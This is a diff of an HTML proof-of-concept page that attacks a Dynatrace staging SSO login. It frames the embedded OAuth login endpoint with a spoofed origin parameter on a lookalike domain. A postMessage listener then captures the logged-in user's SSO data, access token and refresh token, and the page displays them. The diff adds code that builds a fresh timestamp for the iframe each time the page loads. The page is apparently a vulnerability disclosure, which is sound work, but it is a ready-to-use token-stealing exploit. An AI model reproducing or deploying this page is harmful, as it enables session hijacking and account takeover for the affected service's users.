@@ -1,84 +1,94 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>nileninja poc</title>
-    
-    <!-- Link to JetBrains Mono Font -->
+
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
 
-    <!-- Internal CSS for page styling -->
     <style>
-      body {
-        font-family: 'JetBrains Mono', monospace;
-        background-color: #f4f4f9;
-      }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: #f4f4f9;
+        }
 
-      h1 {
-        color: #333;
-        font-size: 2rem;
-      }
+        h1 {
+            color: #333;
+            font-size: 2rem;
+        }
 
-      h2 {
-        color: #555;
-        font-size: 1.5rem;
-      }
+        h2 {
+            color: #555;
+            font-size: 1.5rem;
+        }
 
+        div {
+            font-size: 1.2rem;
+            color: #333;
+        }
 
-      div {
-        font-size: 1.2rem;
-        color: #333;
-      }
-
-      span {
-        font-weight: bold;
-        color: #007BFF;
-        width: 700px;
-        word-wrap: break-word;
-      }
-
+        span {
+            font-weight: bold;
+            color: #007BFF;
+            width: 700px;
+            word-wrap: break-word;
+        }
     </style>
-  </head>
-  <body>
+</head>
+<body>
     <h1>POC file</h1>
-    <iframe src="https://chatstage-one.dynatrace.com/api/sso/oauth2/embedded/login?timestamp=1741941638853&origin=https%3A%2F%2Fchatstage-one.dynatrace.com.nileninja.site"></iframe>
+    <iframe id="myIframe" src=""></iframe>
     <h2>User's Access Token and Refresh Token, Others</h2>
     <div>
-      SSO: <span id="sso"></span>
+        SSO: <span id="sso"></span>
     </div>
     <div>
-      Access Token: <span id="token"></span>
+        Access Token: <span id="token"></span>
     </div>
     <div>
-      Refresh Token: <span id="refresh"></span>
+        Refresh Token: <span id="refresh"></span>
     </div>
     <div>
-      Expires In: <span id="exp"></span>
+        Expires In: <span id="exp"></span>
     </div>
     <div>
-      Error: <span id="err"></span>
+        Error: <span id="err"></span>
     </div>
-    
-    <script>    
-        window.addEventListener("message", event => {
-          // Access the elements where the data will be displayed
-          const sso = document.getElementById('sso');
-          const accessToken = document.getElementById('token');
-          const refreshToken = document.getElementById('refresh');
-          const expiryIn = document.getElementById('exp');
-          const error = document.getElementById('err');
 
-          // Check if the data exists in the event and update the fields
-          if (event.data && event.data.sso !== undefined) {
-            sso.textContent = event.data.sso;
-            accessToken.textContent = event.data.tokenSet.accessToken;
-            refreshToken.textContent = event.data.tokenSet.refreshToken;
-            expiryIn.textContent = event.data.tokenSet.expiresInSeconds;
-            error.textContent = event.data.error ? event.data.error : 'No error';
-          }
-      });
+    <script>
+        function getCurrentUnixTimeMilliseconds() {
+            return Date.now();
+        }
+
+        function updateIframeSrc() {
+            const timestamp = getCurrentUnixTimeMilliseconds();
+            const iframe = document.getElementById('myIframe');
+            const origin = encodeURIComponent('https://chatstage-one.dynatrace.com.nileninja.site'); // Ensure to encode the origin URL
+
+            iframe.src = `https://chatstage-one.dynatrace.com/api/sso/oauth2/embedded/login?timestamp=${timestamp}&origin=${origin}`;
+        }
+
+        updateIframeSrc(); // Call the function to set the iframe source initially
+
+        window.addEventListener("message", event => {
+            // Access the elements where the data will be displayed
+            const sso = document.getElementById('sso');
+            const accessToken = document.getElementById('token');
+            const refreshToken = document.getElementById('refresh');
+            const expiryIn = document.getElementById('exp');
+            const error = document.getElementById('err');
+
+            // Check if the data exists in the event and update the fields
+            if (event.data && event.data.sso !== undefined) {
+                sso.textContent = event.data.sso;
+                accessToken.textContent = event.data.tokenSet.accessToken;
+                refreshToken.textContent = event.data.tokenSet.refreshToken;
+                expiryIn.textContent = event.data.tokenSet.expiresInSeconds;
+                error.textContent = event.data.error ? event.data.error : 'No error';
+            }
+        });
     </script>
-  </body>
+</body>
 </html>
